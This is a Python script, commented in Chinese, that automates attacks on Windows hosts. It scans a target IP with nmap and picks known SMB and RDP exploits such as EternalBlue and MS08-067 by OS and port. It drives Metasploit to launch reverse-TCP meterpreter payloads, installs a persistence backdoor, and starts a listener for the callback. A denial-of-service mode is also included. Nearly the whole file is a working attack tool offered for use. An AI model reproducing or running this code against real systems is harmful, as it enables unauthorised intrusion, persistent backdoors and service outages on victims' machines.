import subprocess
import os,re,time

def rip():
    # 获取攻击目标IP
    rip = input('目标IP:')
    return rip

def lhost():
    #获取本机IP
    #ifconfig查看本机IP
    hack_data = 'ifconfig'
    #执行命令
    hack_cmd = subprocess.Popen(hack_data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,encoding='utf-8')
    #读取反馈信息
    text = hack_cmd.stdout.read()
    hack_cmd.stdout.close()
    #提取IP信息
    lhost = re.compile('inet (.*?) netmask')
    lhost =  lhost.findall(text,re.S)
    #打印本机IP地址
    print('本机IP地址:{}'.format(lhost[0]))
    #返回本机IP
    return lhost[0]

def nmap_rhost(rip):
    #查看目标主机是否存活
    hack_data = 'nmap -sS {}'.format(rip)
    hack_cmd = subprocess.Popen(hack_data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    message = hack_cmd.stdout.read().decode()
    #判断主机是否存活并反馈信息
    str_up = 'Host is up'
    if str_up in message:
        return 1
    else:
        return 0

def msf_run(exploit,payload, lhost, rhost):
    # msf框架渗透
    # msf框架攻击设置,并保存为rc文件
    msf_str = '''
    use {}
    set payload {}
    set lhost {}
    set lport 1235
    set rhost {}
    run 
    '''.format(exploit,payload, lhost, rhost)
    with open('/root/msf.rc', 'w') as f:
        f.write(msf_str)
    #调用msfconsole
    hack_data = 'msfconsole -r /root/msf.rc --real-readline'
    hack_cmd = subprocess.Popen(hack_data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
    #建立后门
    str = 'run persistence -X -i 10 -p 1235 -r {}'.format(lhost)
    hack_cmd.stdin.write(str.encode())
    hack_cmd.stdin.close()
    # 获取渗透结果
    msf = hack_cmd.stdout.read().decode()
    #测试代码
    #print(msf)
    #提取攻击结果信息判断是否渗透成功
    sessions = re.compile('.*?(Exploit completed, but no session was created|C:\\.*?>).*?')
    test = sessions.findall(msf, re.M)
    #判断攻击是否失败，如果攻击成功且获取的是shell会话则返回2，meterpreter会话返回0，失败返回1
    if len(test)==1 and 'Exploit completed, but no session was created' not in msf:
        return 2
    else:
        return len(test)
def msf_exploit(script):
    #搜索漏洞所需的攻击模块
    #根据漏洞编号搜索攻击模块
    msf_str = '''
    search {}
    exit
    '''.format(script)
    #将设置保存为rc文件
    with open('/root/msf_e.rc', 'w') as f:
        f.write(msf_str)
    #调用msfconsole
    hack_data = 'msfconsole -r /root/msf_e.rc --real-readline'
    hack_cmd = subprocess.Popen(hack_data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,encoding='utf-8')
    text = hack_cmd.stdout.read()
    hack_cmd.stdout.close()
    #攻击模块提取
    script = re.compile('.*(exploit/.*?) .*?')
    text =  script.findall(text,re.S)
    return text[0]

def msf_back(lhost):
    #连接后门
    #监听设置
    msf_str = '''
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost {}
    set lport 1235
    run
    '''.format(lhost)
    with open('/root/msf.rc', 'w') as f:
        f.write(msf_str)
    hack_data = 'msfconsole -r /root/msf.rc -q --real-readline'
    #运行msfconsole进行后门回连
    print(subprocess.call(hack_data, shell=True,))

def msf_shell(exploit,payload,lhost):
    #msf渗透
    #攻击设置
    msf_str = '''
    use {}
    set payload {}
    set lhost {}
    set lport 1235
    run
    '''.format(exploit,payload,lhost)
    with open('/root/msf.rc', 'w') as f:
        f.write(msf_str)
    hack_data = 'msfconsole -r /root/msf.rc -q --real-readline'
    print(subprocess.call(hack_data, shell=True,))

def rhost_os(rip):
    #获取目标系统
    hack_data = 'nmap -sS -O {}'.format(rip)
    hack_cmd = subprocess.Popen(hack_data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    message = hack_cmd.stdout.read().decode()
    #提取信息
    script = re.compile('OS CPE: cpe:/o:microsoft:(.*?):')
    text =  script.findall(message,re.S)
    if text!=[]:
        print('目标系统：'+text[0])
        return text[0]
    else:
        return 0

def nmap_all_db(os,port):
    # 根据目标系统和开启的端口，获取该系统端口高危的漏洞的编号
    #系统端口所对应的漏洞编号
    port445_w7 = ['ms17_010']
    port445_wxp = ['ms08_067','ms17_010']
    port445_wservice = ['ms03_026','ms09_050','ms17_010']
    port3389_wservice = ['ms12_020']
    #端口对应的漏洞编号
    wxp = {'445':port445_wxp}
    w7 = {'445':port445_w7}
    wservive = {'445':port445_wservice,'3389':port3389_wservice}
    #系统漏洞字典
    srcipt = {'windows_7': w7, 'windows_xp': wxp, 'windows_server_2003': wservive,'windows_server_2008': wservive,'windows_2000': wservive}
    return srcipt[os][port]

def nmap_session_db(os,port):
    # 根据目标系统和开启的端口，获取该系统端口高危的漏洞的编号
    #系统端口所对应的漏洞编号
    port445_w7 = ['ms17_010']
    port445_wxp = ['ms08_067','ms17_010']
    port445_wservice = ['ms03_026','ms09_050','ms17_010']
    port3389_wservice = ['']
    #端口对应的漏洞编号
    wxp = {'445':port445_wxp}
    w7 = {'445':port445_w7}
    wservive = {'445':port445_wservice,'3389':port3389_wservice}
    #系统漏洞字典
    srcipt = {'windows_7': w7, 'windows_xp': wxp, 'windows_server_2003': wservive,'windows_server_2008': wservive,'windows_2000': wservive}
    return srcipt[os][port]

def nmap_service_db(os,port):
    # 根据目标系统和开启的端口，获取该系统端口高危的漏洞的编号
    #系统端口所对应的漏洞编号
    port3389_w7 = ['']
    port3389_wxp = ['']
    port3389_wservice = ['ms12_020']
    #端口对应的漏洞编号
    wxp = {'3389':port3389_wxp}
    w7 = {'3389':port3389_w7}
    wservive = {'3389':port3389_wservice}
    #系统漏洞字典
    srcipt = {'windows_7': w7, 'windows_xp': wxp, 'windows_server_2003': wservive,'windows_server_2008': wservive}
    return srcipt[os][port]

def rhost_port(rip):
    #查看目标开启的端口
    hack_data = 'nmap -sS -O {}'.format(rip)
    hack_cmd = subprocess.Popen(hack_data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    message = hack_cmd.stdout.read().decode()
    #提取目标所开启的端口号
    script = re.compile(r'.*?(\d*?)/tcp.*?open.*?',re.S)
    port =  script.findall(message,re.S)
    print('目标开启的端口：{}'.format(port))
    return port

def msf_set(srcipt):
    #漏洞库
    num = {
        'ms17_010':['exploit/windows/smb/ms17_010_eternalblue','windows/x64/meterpreter/reverse_tcp'],
        'ms08_067':['exploit/windows/smb/ms08_067_netapi','windows/meterpreter/reverse_tcp'],
        'ms09_050':['exploit/windows/smb/ms09_050_smb2_negotiate_func_index','windows/meterpreter/reverse_tcp'],
        'ms12_020':['auxiliary/dos/windows/rdp/ms12_020_maxchannelids', 'windows/x64/meterpreter/reverse_tcp'],
        'ms03_026':['exploit/windows/dcerpc/ms03_026_dcom','windows/meterpreter/reverse_tcp']
    }
    #根据输入的漏洞编号获取对应漏洞的设置
    set = num[srcipt]
    return set[0],set[1]

def choice():
    ch = input('''
攻击模式：
  1，远程代码执行
  2，拒绝服务
  3，全选
请选择攻击模式（1 or 2 or 3）：''')
    return ch

def progress(n,a):
    m = int(n / a * 100)
    x = int(n / a * 10)
    time.sleep(0.02)    #只是为了让进度条明显
    #print("程序初始化",end='')
    print("\r程序初始化%s %s%%" %("======"*x,m),end="")  #主要用到的是"\r"会每次打印都在本页面的起始位置，end=""不让print换行

def gui():
    str='''
 _____            _       _ _           _   _              ___   ____ _____
| ____|_  ___ __ | | ___ (_) |_ ___  __| | | |__  _   _   / _ \ / ___|__  /
|  _| \ \/ / '_ \| |/ _ \| | __/ _ \/ _` | | '_ \| | | | | | | | |     / / 
| |___ >  <| |_) | | (_) | | ||  __/ (_| | | |_) | |_| | | |_| | |___ / /_ 
|_____/_/\_\ .__/|_|\___/|_|\__\___|\__,_| |_.__/ \__, |  \__\_\\____ /____|
            |_|                                   |___/                    
'''
    print(str)


if __name__=="__main__":
    for i in range(101):
        progress(i, a=100)
    gui()
    #主程序
    #获取目标IP
    rip = rip()
    #获取本机IP
    lhost = lhost()
    #查看目标主机是否存活
    rhost = nmap_rhost(rip)
    if rhost==1:
        # 获取目标系统
        rhost_os = rhost_os(rip)
        if rhost_os == 0:
                print('没检测到目标主机所用的系统,目标主机开启了防火墙')
        else:
            # 获取目标开启的端口号
            rhost_port = rhost_port(rip)
            #if rhost_port()
            num = choice()
            num = eval(num)
            run = 1
            #根据用户的选择进行相应的攻击
            if num == 1:
                #远程代码执行漏洞攻击
                exploit_num = []
                #根据系统版本和开启的端口号判断可能存在漏洞
                for port in rhost_port:
                    try:
                        exploit_num = nmap_session_db(rhost_os, port)
                        break
                    except:
                        pass
                #根据可能存在的漏洞，依次进行漏洞攻击
                for n in exploit_num:
                    exploit, payload = msf_set(n)
                    print(n + '攻击')
                    back = msf_run(exploit, payload, lhost, rip)
                    if back == 0:
                        print(n + '漏洞利用成功')
                        run = 0
                        break
                    else:
                        print(n + '')
                        run = 1

            #
            elif num == 2:
                #拒绝服务攻击
                exploit_num = []
                #根据系统版本和开启的端口号判断可能存在漏洞
                for port in rhost_port:
                    try:
                        exploit_num = nmap_service_db(rhost_os,port)
                        print(exploit_num)
                        break
                    except:
                        pass
                #根据可能存在的漏洞，依次进行漏洞攻击
                for n in exploit_num:
                    exploit,payload = msf_set(n)
                    print(n + '攻击')
                    back = msf_run(exploit,payload,lhost,rip)
                    dos = nmap_rhost(rip)
                    run = 1
                    if dos==0:
                        print(n + '攻击成功')
                        run = 5
                        break
                    else:
                        print(n + '漏洞利用失败')
            #
            elif num==3:
            	#远程代码执行或拒绝服务攻击（远程代码执行优先）
                exploit_num = []
                #根据系统版本和开启的端口号判断可能存在漏洞
                for port in rhost_port:
                    try:
                        exploit_num = nmap_all_db(rhost_os,port)
                        break
                    except:
                        pass
                #根据可能存在的漏洞，依次进行漏洞攻击
                for n in exploit_num:
                    exploit,payload = msf_set(n)
                    print(n + '攻击')
                    back = msf_run(exploit,payload,lhost,rip)
                    #判断攻击结果
                    if back == 0:
                        print(n + '漏洞利用成功')
                        run = 0
                        break
                    else:
                        print(n + '')
                        run = 1
            #根据不同攻击的结果进行判断并对攻击做后续的处理
            if run==0:
                #攻击成功，进行后门回连
                msf_back(lhost)
            elif run==2:
                #攻击成功，再次进行攻击
                msf_shell(exploit,payload,rip)
            elif run==1:
                print('漏洞利用完成，未利用成功')

    else:
        print('目标网络不可达')

